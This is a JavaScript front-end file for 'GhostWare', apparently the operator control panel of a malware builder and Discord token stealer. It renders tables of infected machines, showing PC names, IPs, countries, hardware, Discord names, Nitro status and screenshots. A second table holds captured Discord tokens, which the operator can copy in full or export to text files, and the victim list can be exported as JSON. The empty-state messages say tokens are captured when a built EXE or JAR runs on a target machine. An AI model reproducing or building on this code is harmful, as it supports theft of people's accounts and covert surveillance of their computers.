/* ===================== GhostWare — Connections + Tokens =====================
   Two sub-tabs:
     Connections — table: Pc Name | IP | Country | Hardware | Windows | Status | Options
     Tokens      — table: Pc Name | IP | Country | Captured | Discord Token
   Stats cards update on every change. Persisted by main process.
   ========================================================================== */
(function () {

  /* ─────────────────── shared helpers ─────────────────── */
  const $ = (id) => document.getElementById(id);
  function esc(s) {
    return String(s == null ? '—' : s).replace(/[&<>"]/g, c =>
      ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])
    );
  }
  function fmt(ts) {
    if (!ts) return '—';
    try { return new Date(ts).toLocaleString(); } catch { return '—'; }
  }
  const FLAGS = {
    'United States':'🇺🇸','US':'🇺🇸','United Kingdom':'🇬🇧','UK':'🇬🇧',
    'Germany':'🇩🇪','France':'🇫🇷','Canada':'🇨🇦','Australia':'🇦🇺',
    'Netherlands':'🇳🇱','Russia':'🇷🇺','Brazil':'🇧🇷','Japan':'🇯🇵',
    'China':'🇨🇳','India':'🇮🇳','Italy':'🇮🇹','Spain':'🇪🇸',
    'Sweden':'🇸🇪','Poland':'🇵🇱','Mexico':'🇲🇽','South Korea':'🇰🇷',
    'Oman':'🇴🇲','Turkey':'🇹🇷','Ukraine':'🇺🇦','Romania':'🇷🇴',
  };
  function flag(country) {
    const f = FLAGS[country] || '';
    return f ? f + ' ' : '';
  }
  function shortHw(hw) {
    return (hw || '—').replace(/\s+Family\s+\d+.*$/i, '').trim() || '—';
  }
  function shortWin(win) {
    if (!win || win === '—') return '—';
    if (win.includes('10.0.22')) return 'Windows 11';
    if (win.includes('10.0.') || win.includes('6.2') || win.includes('6.3')) return 'Windows 10';
    return win.length > 22 ? win.slice(0, 22) + '…' : win;
  }

  /* ─────────────────── state ─────────────────── */
  let allConns    = [];   // filtered list (no local)
  let allTokens   = [];
  let filtConns   = [];
  let filtTokens  = [];

  let connPage = 1, connPer = 10, connQ = '';
  let tokPage  = 1, tokPer  = 10, tokQ  = '';

  /* ─────────────────── stat cards ─────────────────── */
  function updateStats() {
    const totalEl  = $('conn-stat-total');
    const activeEl = $('conn-stat-active');
    const exeEl    = $('conn-stat-exe');
    const tokEl    = $('conn-stat-tokens');
    if (totalEl)  totalEl.textContent  = allConns.length;
    if (activeEl) activeEl.textContent = allConns.filter(c => c.status === 'online').length;
    if (exeEl)    exeEl.textContent    = allConns.filter(c => c.type === 'exe').length;
    if (tokEl)    tokEl.textContent    = allTokens.length;
  }

  /* ─────────────────── sub-tab switching ─────────────────── */
  function wireSubTabs() {
    document.querySelectorAll('[data-ctab]').forEach(btn => {
      btn.addEventListener('click', () => {
        // update button active state
        document.querySelectorAll('[data-ctab]').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        // show correct pane
        document.querySelectorAll('.ctab-pane').forEach(p => p.classList.remove('active'));
        const pane = $(btn.dataset.ctab);
        if (pane) pane.classList.add('active');
      });
    });
  }

  /* ══════════════════════════════════════════════
     CONNECTIONS TABLE
  ══════════════════════════════════════════════ */
  function renderConns() {
    const tbody = $('connections-list');
    if (!tbody) return;

    const q = connQ.toLowerCase();
    filtConns = q
      ? allConns.filter(c =>
          (c.pcName   || '').toLowerCase().includes(q) ||
          (c.ip       || '').toLowerCase().includes(q) ||
          (c.country  || '').toLowerCase().includes(q) ||
          (c.hardware || '').toLowerCase().includes(q) ||
          (c.windows  || '').toLowerCase().includes(q)
        )
      : [...allConns];

    const total = filtConns.length;
    const pages = Math.max(1, Math.ceil(total / connPer));
    if (connPage > pages) connPage = pages;
    const slice = filtConns.slice((connPage - 1) * connPer, connPage * connPer);

    updateStats();

    if (!slice.length) {
      tbody.innerHTML = `<tr class="ctn-empty-row"><td colspan="11">${
        q ? 'No connections match your search.'
          : 'No connections yet — build and run an EXE or JAR to see them here.'
      }</td></tr>`;
      renderConnPag(pages, total);
      return;
    }

    tbody.innerHTML = slice.map(c => {
      const online = c.status === 'online';
      const typeTag = c.type === 'exe'
        ? `<span class="ctn-type-tag ctn-exe-tag">EXE</span>`
        : `<span class="ctn-type-tag ctn-jar-tag">JAR</span>`;
      const pcCell = c.type === 'jar' && c.mcUsername
        ? `${typeTag} ${esc(c.pcName)}<br><span class="ctn-mc-sub">${esc(c.mcUsername)}</span>`
        : `${typeTag} ${esc(c.pcName)}`;
      const status = online
        ? `<span class="ctn-online"><span class="ctn-dot"></span>Online</span>`
        : `<span class="ctn-offline"><span class="ctn-dot"></span>Offline</span>`;
      const thumb = c.screenshot
        ? `<img src="${c.screenshot}" class="conn-thumb" title="Click to view full screenshot" onclick="window.open(this.src)" />`
        : `<span style="color:var(--txt-faint);font-size:11px;">No screenshot</span>`;
      const nitroCell = c.hasNitro === 'Yes'
        ? `<span style="color:#7dffa0;font-weight:600;">✓ Yes</span>`
        : `<span style="color:var(--txt-faint);">No</span>`;
      return `<tr class="ctn-row">
        <td class="ctn-pcname">${pcCell}</td>
        <td class="ctn-ip">
          ${esc(c.ip)}
          ${c.port ? `<br><span style="color:#8892b0;font-size:11px;">Port: ${esc(c.port)}</span>` : ''}
        </td>
        <td>${flag(c.country)}${esc(c.country)}</td>
        <td class="ctn-hw">${esc(shortHw(c.hardware))}</td>
        <td class="ctn-win">${esc(shortWin(c.windows))}</td>
        <td>${esc(c.discordName || '—')}</td>
        <td>${nitroCell}</td>
        <td style="font-size:12px;">${esc(c.acctDate || '—')}</td>
        <td>${status}</td>
        <td>${thumb}</td>
        <td><button class="ctn-opts-btn" data-id="${esc(c.id)}" title="Remove">⋮</button></td>
      </tr>`;
    }).join('');

    tbody.querySelectorAll('.ctn-opts-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!confirm('Remove this connection?')) return;
        const id = btn.dataset.id;
        if (window.electronAPI) {
          try { await window.electronAPI.removeConnection(id); } catch (_) {}
        }
        allConns = allConns.filter(x => x.id !== id);
        renderConns();
      });
    });

    renderConnPag(pages, total);
  }

  function renderConnPag(pages, total) {
    const el = $('conn-pagination');
    if (!el) return;
    const start = total === 0 ? 0 : (connPage - 1) * connPer + 1;
    const end   = Math.min(connPage * connPer, total);
    let html = `<span class="ctn-pag-info">Showing ${start} to ${end} of ${total} entries</span>`;
    html += `<div class="ctn-pag-btns">`;
    html += `<button class="ctn-pag-btn" ${connPage===1?'disabled':''} data-p="${connPage-1}">&#8249; Previous</button>`;
    for (let i = 1; i <= pages; i++)
      html += `<button class="ctn-pag-btn ${i===connPage?'active':''}" data-p="${i}">${i}</button>`;
    html += `<button class="ctn-pag-btn" ${connPage===pages?'disabled':''} data-p="${connPage+1}">Next &#8250;</button>`;
    html += `</div>`;
    el.innerHTML = html;
    el.querySelectorAll('.ctn-pag-btn[data-p]').forEach(b => {
      b.addEventListener('click', () => { if (!b.disabled) { connPage = +b.dataset.p; renderConns(); } });
    });
  }

  /* ══════════════════════════════════════════════
     TOKENS TABLE
  ══════════════════════════════════════════════ */
  function renderTokens() {
    const tbody = $('tokens-list');
    if (!tbody) return;

    const q = tokQ.toLowerCase();
    filtTokens = q
      ? allTokens.filter(t =>
          (t.pcName  || '').toLowerCase().includes(q) ||
          (t.ip      || '').toLowerCase().includes(q) ||
          (t.country || '').toLowerCase().includes(q) ||
          (t.token   || '').toLowerCase().includes(q)
        )
      : [...allTokens];

    const total = filtTokens.length;
    const pages = Math.max(1, Math.ceil(total / tokPer));
    if (tokPage > pages) tokPage = pages;
    const slice = filtTokens.slice((tokPage - 1) * tokPer, tokPage * tokPer);

    updateStats();

    if (!slice.length) {
      tbody.innerHTML = `<tr class="ctn-empty-row"><td colspan="4">${
        q ? 'No tokens match your search.'
          : 'No tokens yet — tokens are captured when a built EXE runs on a target machine.'
      }</td></tr>`;
      renderTokPag(pages, total);
      return;
    }

    tbody.innerHTML = slice.map(t => {
      const tok = t.token || '';
      const display = tok.length > 30
        ? tok.slice(0, 12) + '••••••••••••' + tok.slice(-8)
        : (tok || '—');
      const nitroCell = t.hasNitro === 'Yes'
        ? `<span style="color:#7dffa0;font-weight:600;">✓ Yes</span>`
        : `<span style="color:var(--txt-faint);">No</span>`;
      
      // Discord profile picture as circle before name
      const pfpHtml = t.discordPfp 
        ? `<img src="${esc(t.discordPfp)}" class="tok-pfp" alt="" />`
        : `<div class="tok-pfp tok-pfp-empty"></div>`;
      const nameDisplay = t.discordName || t.pcName || '—';
      
      return `<tr class="ctn-row">
        <td class="ctn-pcname">
          <div style="display:flex;align-items:center;gap:10px;">
            ${pfpHtml}
            <span>${esc(nameDisplay)}</span>
          </div>
        </td>
        <td>${nitroCell}</td>
        <td style="font-size:12px;">${esc(t.acctDate || '—')}</td>
        <td>
          <button class="tok-copy-btn" data-token="${esc(tok)}" title="Click to copy full token">${esc(display)}</button>
          <button class="ctn-opts-btn" data-id="${esc(t.id)}" title="Remove" style="margin-left:6px;">⋮</button>
        </td>
      </tr>`;
    }).join('');

    // Copy token on click
    tbody.querySelectorAll('.tok-copy-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const tok = btn.dataset.token;
        if (!tok) return;
        navigator.clipboard.writeText(tok).then(() => {
          btn.classList.add('copied');
          const orig = btn.textContent;
          btn.textContent = 'Copied!';
          setTimeout(() => { btn.classList.remove('copied'); btn.textContent = orig; }, 1500);
        }).catch(() => {});
      });
    });

    // Remove token
    tbody.querySelectorAll('.ctn-opts-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!confirm('Remove this token?')) return;
        const id = btn.dataset.id;
        if (window.electronAPI) {
          try { await window.electronAPI.removeToken(id); } catch (_) {}
        }
        allTokens = allTokens.filter(t => t.id !== id);
        renderTokens();
      });
    });

    renderTokPag(pages, total);
  }

  function renderTokPag(pages, total) {
    const el = $('tok-pagination');
    if (!el) return;
    const start = total === 0 ? 0 : (tokPage - 1) * tokPer + 1;
    const end   = Math.min(tokPage * tokPer, total);
    let html = `<span class="ctn-pag-info">Showing ${start} to ${end} of ${total} entries</span>`;
    html += `<div class="ctn-pag-btns">`;
    html += `<button class="ctn-pag-btn" ${tokPage===1?'disabled':''} data-p="${tokPage-1}">&#8249; Previous</button>`;
    for (let i = 1; i <= pages; i++)
      html += `<button class="ctn-pag-btn ${i===tokPage?'active':''}" data-p="${i}">${i}</button>`;
    html += `<button class="ctn-pag-btn" ${tokPage===pages?'disabled':''} data-p="${tokPage+1}">Next &#8250;</button>`;
    html += `</div>`;
    el.innerHTML = html;
    el.querySelectorAll('.ctn-pag-btn[data-p]').forEach(b => {
      b.addEventListener('click', () => { if (!b.disabled) { tokPage = +b.dataset.p; renderTokens(); } });
    });
  }

  /* ─────────────────── toolbar wiring ─────────────────── */
  function wireControls() {
    // Connections search
    const cs = $('conn-search');
    if (cs) cs.addEventListener('input', () => { connQ = cs.value.trim(); connPage = 1; renderConns(); });

    // Connections per-page
    const cp = $('conn-per-page');
    if (cp) cp.addEventListener('change', () => { connPer = +cp.value; connPage = 1; renderConns(); });

    // Refresh
    const rb = $('refresh-connections');
    if (rb) {
      rb.addEventListener('click', async () => {
        if (window.electronAPI) {
          try {
            const [c, t] = await Promise.all([
              window.electronAPI.getConnections(),
              window.electronAPI.getTokens(),
            ]);
            allConns   = (c || []).filter(x => x.type !== 'local');
            allTokens  = t || [];
          } catch (_) {}
        }
        renderConns();
        renderTokens();
        if (window.GWSound) window.GWSound.click();
      });
    }

    // Export connections JSON
    const ec = $('export-connections');
    if (ec) {
      ec.addEventListener('click', () => {
        const blob = new Blob([JSON.stringify({ timestamp: new Date().toISOString(), connections: filtConns }, null, 2)], { type: 'application/json' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'connections-' + new Date().toISOString().slice(0,10) + '.json';
        a.click();
        URL.revokeObjectURL(a.href);
      });
    }

    // Tokens search
    const ts = $('tok-search');
    if (ts) ts.addEventListener('input', () => { tokQ = ts.value.trim(); tokPage = 1; renderTokens(); });

    // Tokens per-page
    const tp = $('tok-per-page');
    if (tp) tp.addEventListener('change', () => { tokPer = +tp.value; tokPage = 1; renderTokens(); });

    // Export tokens .txt
    const et = $('export-tokens');
    if (et) {
      et.addEventListener('click', () => {
        const lines = allTokens.map(t =>
          `PC: ${t.pcName} | IP: ${t.ip} | Country: ${t.country} | Token: ${t.token} | Captured: ${fmt(t.capturedAt)}`
        ).join('\n');
        const blob = new Blob([lines || 'No tokens captured yet.'], { type: 'text/plain' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'ghostware-tokens-' + new Date().toISOString().slice(0,10) + '.txt';
        a.click();
        URL.revokeObjectURL(a.href);
        if (window.GWSound) window.GWSound.ok();
      });
    }
  }

  /* ─────────────────── update handlers ─────────────────── */
  function handleConnUpdate(list) {
    allConns = (list || []).filter(c => c.type !== 'local');
    renderConns();
    updateStats();
  }
  function handleTokUpdate(list) {
    allTokens = list || [];
    renderTokens();
    updateStats();
  }

  /* ─────────────────── init ─────────────────── */
  let initialized = false;
  const init = async () => {
    // Wire sub-tabs every time (safe to re-call — addEventListener is idempotent with named functions)
    wireSubTabs();

    if (!initialized) {
      initialized = true;
      wireControls();

      if (window.electronAPI) {
        window.electronAPI.onConnectionUpdate(list => handleConnUpdate(list));
        window.electronAPI.onTokenUpdate(list => handleTokUpdate(list));
        window.electronAPI.onShowConnections(() => { if (window.goto) window.goto('connections'); });
      }
    }

    if (window.electronAPI) {
      try {
        const [c, t] = await Promise.all([
          window.electronAPI.getConnections(),
          window.electronAPI.getTokens(),
        ]);
        allConns  = (c || []).filter(x => x.type !== 'local');
        allTokens = t || [];
      } catch (_) {}
    }

    renderConns();
    renderTokens();
    updateStats();
  };

  /* ─────────────────── exports ─────────────────── */
  window.GWConnections = { init, handleConnUpdate, handleTokUpdate, getConnections: () => allConns };
})();